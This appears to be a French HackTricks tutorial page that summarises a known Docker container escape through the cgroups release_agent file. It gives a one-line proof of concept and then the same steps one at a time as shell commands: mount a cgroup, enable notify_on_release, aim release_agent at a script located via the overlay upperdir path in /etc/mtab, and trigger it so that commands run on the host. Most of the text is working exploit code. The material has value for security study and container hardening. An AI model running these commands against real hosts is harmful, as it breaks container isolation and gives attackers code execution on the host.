# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Pour plus de détails, référez-vous au** [**post de blog original**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ceci n'est qu'un résumé :

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
La preuve de concept (PoC) démontre une méthode pour exploiter les cgroups en créant un fichier `release_agent` et en déclenchant son invocation pour exécuter des commandes arbitraires sur l'hôte du conteneur. Voici un aperçu des étapes impliquées :

1. **Préparer l'environnement :**
- Un répertoire `/tmp/cgrp` est créé pour servir de point de montage pour le cgroup.
- Le contrôleur de cgroup RDMA est monté sur ce répertoire. En cas d'absence du contrôleur RDMA, il est suggéré d'utiliser le contrôleur de cgroup `memory` comme alternative.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurer le cgroup enfant :**
- Un cgroup enfant nommé "x" est créé dans le répertoire cgroup monté.
- Les notifications sont activées pour le cgroup "x" en écrivant 1 dans son fichier notify_on_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurer le Release Agent :**
- Le chemin du conteneur sur l'hôte est obtenu à partir du fichier /etc/mtab.
- Le fichier release_agent du cgroup est ensuite configuré pour exécuter un script nommé /cmd situé au chemin de l'hôte acquis.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Créer et configurer le script /cmd :**
- Le script /cmd est créé à l'intérieur du conteneur et est configuré pour exécuter ps aux, redirigeant la sortie vers un fichier nommé /output dans le conteneur. Le chemin complet de /output sur l'hôte est spécifié.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Déclencher l'attaque :**
- Un processus est initié dans le cgroup enfant "x" et est immédiatement terminé.
- Cela déclenche le `release_agent` (le script /cmd), qui exécute ps aux sur l'hôte et écrit la sortie dans /output à l'intérieur du conteneur.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
